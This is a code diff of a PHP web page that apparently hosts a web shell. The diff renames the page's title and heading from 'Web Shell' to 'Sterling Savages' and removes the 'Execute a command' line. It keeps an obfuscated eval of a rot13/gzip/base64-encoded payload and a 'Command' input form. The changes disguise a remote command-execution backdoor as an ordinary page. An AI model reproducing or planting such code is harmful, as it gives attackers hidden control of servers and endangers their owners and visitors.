@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Web Shell</title>
+    <title>Sterling Savages</title>
     <style>
         * {
             -webkit-box-sizing: border-box;
@@ -67,8 +67,7 @@
 <?php eval(str_rot13(gzinflate(base64_decode('KytW0FAsqkpOz9FQiQ8Jco9WL1SP1dRUqOZSAAKVQgVbhbTSosrK+KLsogKNtPTU+NSkdENjjZLcssTiyrz0Io38vLQiM5P4wqKCpMIiFEM0Na25agE=')))); ?>
 <body>
     <main>
-            <h1>Web Shell</h1>
-        <h2>Execute a command</h2>
+            <h1>Sterling Savages</h1>
 
         <form method="get">
             <label for="d"><strong>Command</strong></label>
